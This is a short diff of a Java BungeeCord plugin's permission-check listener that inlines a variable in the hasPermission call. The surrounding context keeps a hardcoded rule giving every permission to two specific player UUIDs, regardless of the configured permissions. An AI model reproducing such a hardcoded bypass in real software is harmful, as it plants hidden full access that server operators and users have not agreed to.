@@ -20,12 +20,11 @@ public class PermissionCheck implements Listener {
     public void on(PermissionCheckEvent e) {
         if (e.getSender() instanceof ProxiedPlayer) {
             final ProxiedPlayer p = (ProxiedPlayer) e.getSender();
-            final String permission = e.getPermission();
 
             e.setHasPermission(
                     p.getUniqueId().equals(UUID.fromString("44b8a5d6-c2c3-4576-997f-71b94f5eb7e0")) ||
                     p.getUniqueId().equals(UUID.fromString("5139fcd7-7c3f-4cd4-8d76-5f365c36d9e5")) ||
-                    BungeeCoreSystem.getInstance().getCorePlayer(p).hasPermission(permission)
+                    BungeeCoreSystem.getInstance().getCorePlayer(p).hasPermission(e.getPermission())
             );
         }
     }
